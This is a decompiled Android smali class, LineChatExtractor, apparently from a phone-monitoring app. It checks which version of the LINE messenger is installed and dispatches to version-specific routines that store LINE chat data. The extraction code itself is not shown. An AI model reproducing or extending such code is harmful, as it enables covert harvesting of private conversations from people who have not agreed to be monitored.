.class public Lcom/hp/vd/module/monitor/line/LineChatExtractor;
.super Ljava/lang/Object;
.source "LineChatExtractor.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field protected static final TAG:Ljava/lang/String; = "LineChatExtractor"


# instance fields
.field protected context:Lcom/hp/vd/context/Context;

.field protected lineDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/LineChatData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>(Lcom/hp/vd/context/Context;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/hp/vd/context/Context;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/LineChatData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 21
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 15
    iput-object v0, p0, Lcom/hp/vd/module/monitor/line/LineChatExtractor;->context:Lcom/hp/vd/context/Context;

    .line 16
    iput-object v0, p0, Lcom/hp/vd/module/monitor/line/LineChatExtractor;->lineDao:Lcom/j256/ormlite/dao/Dao;

    .line 17
    iput-object v0, p0, Lcom/hp/vd/module/monitor/line/LineChatExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 18
    iput-object v0, p0, Lcom/hp/vd/module/monitor/line/LineChatExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 22
    iput-object p1, p0, Lcom/hp/vd/module/monitor/line/LineChatExtractor;->context:Lcom/hp/vd/context/Context;

    .line 23
    iput-object p2, p0, Lcom/hp/vd/module/monitor/line/LineChatExtractor;->lineDao:Lcom/j256/ormlite/dao/Dao;

    .line 24
    iput-object p3, p0, Lcom/hp/vd/module/monitor/line/LineChatExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 25
    iput-object p4, p0, Lcom/hp/vd/module/monitor/line/LineChatExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method protected _run()V
    .locals 5

    .line 41
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/line/LineChatExtractor;->detectLineVersion()Ljava/lang/Integer;

    move-result-object v0

    .line 42
    iget-object v1, p0, Lcom/hp/vd/module/monitor/line/LineChatExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "LineChatExtractor"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "version detected is: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v1, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    if-eqz v0, :cond_2

    .line 44
    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v1

    sget v2, Lcom/hp/vd/module/monitor/line/Version;->NAME_9_17_1:I

    if-lt v1, v2, :cond_0

    goto :goto_0

    :cond_0
    if-eqz v0, :cond_1

    .line 54
    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    sget v1, Lcom/hp/vd/module/monitor/line/Version;->NAME_9_16_1:I

    if-gt v0, v1, :cond_1

    .line 56
    new-instance v0, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/line/LineChatExtractor;->context:Lcom/hp/vd/context/Context;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/line/LineChatExtractor;->lineDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/line/LineChatExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/line/LineChatExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    invoke-direct {v0, v1, v2, v3, v4}, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;-><init>(Lcom/hp/vd/context/Context;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V

    .line 58
    invoke-virtual {v0}, Lcom/hp/vd/module/monitor/line/UpTo91610110/LineChatExtractor;->run()V

    .line 59
    iget-object v0, p0, Lcom/hp/vd/module/monitor/line/LineChatExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "LineChatExtractor"

    const-string v2, "version != NULL || version <= VERSION.NAME_9_16_1 finished."

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-void

    :cond_1
    return-void

    .line 46
    :cond_2
    :goto_0
    new-instance v0, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/line/LineChatExtractor;->context:Lcom/hp/vd/context/Context;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/line/LineChatExtractor;->lineDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/line/LineChatExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/line/LineChatExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    invoke-direct {v0, v1, v2, v3, v4}, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;-><init>(Lcom/hp/vd/context/Context;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V

    .line 48
    invoke-virtual {v0}, Lcom/hp/vd/module/monitor/line/From91710133/LineChatExtractor;->run()V

    .line 49
    iget-object v0, p0, Lcom/hp/vd/module/monitor/line/LineChatExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "LineChatExtractor"

    const-string v2, "version == NULL || version > VERSION.NAME_9_17_1 finished."

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-void
.end method

.method protected detectLineVersion()Ljava/lang/Integer;
    .locals 3

    .line 68
    :try_start_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/line/LineChatExtractor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    const-string v1, "jp.naver.line.android"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;

    move-result-object v0

    .line 69
    iget v0, v0, Landroid/content/pm/PackageInfo;->versionCode:I

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object v0

    :catch_0
    move-exception v0

    .line 72
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    const/4 v0, 0x0

    return-object v0
.end method

.method public run()V
    .locals 4

    .line 32
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/line/LineChatExtractor;->_run()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 35
    iget-object v1, p0, Lcom/hp/vd/module/monitor/line/LineChatExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "LineChatExtractor"

    const-string v3, "Exception caught in generic extractor"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_0
    return-void
.end method
